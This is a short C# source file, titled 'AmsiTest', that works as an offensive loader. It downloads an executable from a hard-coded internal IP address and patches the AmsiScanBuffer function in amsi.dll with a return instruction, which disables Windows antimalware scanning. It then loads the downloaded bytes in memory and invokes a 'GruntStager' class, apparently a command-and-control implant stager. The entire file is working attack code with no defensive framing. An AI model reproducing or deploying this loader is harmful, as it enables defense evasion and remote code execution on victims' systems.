using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace AmsiTest
{
    class Program
    {
        static void Main(string[] args)
        {
            var client = new WebClient();
            var gruntStager = client.DownloadData("http://10.8.0.178/dead.exe");
            client.Dispose();

            var amsiDll = LoadLibrary("amsi.dll");
            var asbAddress = GetProcAddress(amsiDll, "AmsiScanBuffer");
            var ret = new byte[] { 0xC3 };
            VirtualProtect(asbAddress, (UIntPtr)ret.Length, 0x40, out uint oldProtect);
            Marshal.Copy(ret, 0, asbAddress, ret.Length);
            VirtualProtect(asbAddress, (UIntPtr)ret.Length, oldProtect, out uint _);

            var asm = Assembly.Load(gruntStager);
            var type = asm.GetType("GruntStager.GruntStager");
            var instance = Activator.CreateInstance(type);
            type.InvokeMember("GruntStager", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);

        }

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
